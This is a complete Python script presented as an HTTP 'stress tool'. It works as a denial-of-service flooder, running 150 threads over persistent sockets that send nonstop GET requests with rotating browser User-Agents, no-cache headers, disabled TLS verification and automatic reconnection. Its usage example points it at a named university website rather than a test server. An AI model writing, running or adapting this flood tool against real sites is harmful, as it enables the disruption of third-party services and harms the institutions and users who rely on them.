#!/usr/bin/env python3
"""
stress.py - Raw HTTP GET stress tool
Usage: python3 stress.py <target_url> <duration_seconds>
Example: python3 stress.py https://andrews.csu.edu.ph 120
"""

import socket
import ssl
import threading
import time
import sys
import random
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

# ===== CONFIG =====
THREADS_PER_WORKER = 30   # 5 workers * 30 = 150 threads
WORKER_COUNT = 5
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
]

class RawHTTPStress:
    def __init__(self, url, duration):
        self.parsed = urllib.parse.urlparse(url)
        self.host = self.parsed.hostname
        self.port = self.parsed.port or (443 if self.parsed.scheme == "https" else 80)
        self.ssl = self.parsed.scheme == "https"
        self.path = self.parsed.path or "/"
        if self.parsed.query:
            self.path += "?" + self.parsed.query
        self.duration = duration
        self.running = True
        self.total_requests = 0
        self.lock = threading.Lock()

    def build_request(self):
        ua = random.choice(USER_AGENTS)
        headers = (
            f"GET {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Accept: */*\r\n"
            f"Accept-Encoding: gzip, deflate, br\r\n"
            f"Accept-Language: en-US,en;q=0.9\r\n"
            f"Cache-Control: no-cache\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
        )
        return headers.encode()

    def send_request(self, sock):
        req = self.build_request()
        try:
            sock.send(req)
            # Read first chunk to avoid socket buffer full (optional)
            sock.settimeout(2.0)
            try:
                sock.recv(4096)
            except:
                pass
            with self.lock:
                self.total_requests += 1
            return True
        except:
            return False

    def worker_session(self, worker_id):
        """Each worker manages its own persistent TCP connection pool."""
        # Create a pool of sockets per worker (30 threads = 30 sockets)
        sockets = []
        for _ in range(THREADS_PER_WORKER):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5.0)
                if self.ssl:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=self.host)
                sock.connect((self.host, self.port))
                sockets.append(sock)
            except:
                sockets.append(None)

        def worker_thread(sock):
            while self.running:
                if sock is None:
                    # Reconnect if dead
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(5.0)
                        if self.ssl:
                            context = ssl.create_default_context()
                            context.check_hostname = False
                            context.verify_mode = ssl.CERT_NONE
                            sock = context.wrap_socket(sock, server_hostname=self.host)
                        sock.connect((self.host, self.port))
                    except:
                        time.sleep(0.1)
                        continue
                if not self.send_request(sock):
                    sock.close()
                    sock = None

        # Launch 30 threads for this worker
        threads = []
        for i, sock in enumerate(sockets):
            t = threading.Thread(target=worker_thread, args=(sock,))
            t.daemon = True
            t.start()
            threads.append(t)

        # Keep alive until duration ends
        time.sleep(self.duration)

        # Signal stop and cleanup
        self.running = False
        for t in threads:
            t.join(timeout=1)
        for sock in sockets:
            try:
                if sock:
                    sock.close()
            except:
                pass

    def run(self):
        print(f"[+] Target: {self.parsed.scheme}://{self.host}:{self.port}{self.path}")
        print(f"[+] Duration: {self.duration}s")
        print(f"[+] Workers: {WORKER_COUNT} x {THREADS_PER_WORKER} threads = {WORKER_COUNT * THREADS_PER_WORKER} total")
        print("[+] Starting stress... (Ctrl+C to stop early)")

        start_time = time.time()
        with ThreadPoolExecutor(max_workers=WORKER_COUNT) as executor:
            futures = [executor.submit(self.worker_session, i) for i in range(WORKER_COUNT)]
            try:
                # Wait for all workers to finish (or duration to end)
                for f in as_completed(futures):
                    pass
            except KeyboardInterrupt:
                self.running = False
                print("\n[!] Interrupted by user")

        elapsed = time.time() - start_time
        print(f"[+] Done. Total requests sent: {self.total_requests}")
        print(f"[+] Requests/sec: {self.total_requests / elapsed:.2f}")
        print("[+] Stress complete.")

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 stress.py <target_url> <duration_seconds>")
        print("Example: python3 stress.py https://andrews.csu.edu.ph 120")
        sys.exit(1)

    url = sys.argv[1]
    try:
        duration = int(sys.argv[2])
    except ValueError:
        print("[!] Duration must be an integer (seconds)")
        sys.exit(1)

    stress = RawHTTPStress(url, duration)
    stress.run()

if __name__ == "__main__":
    main()
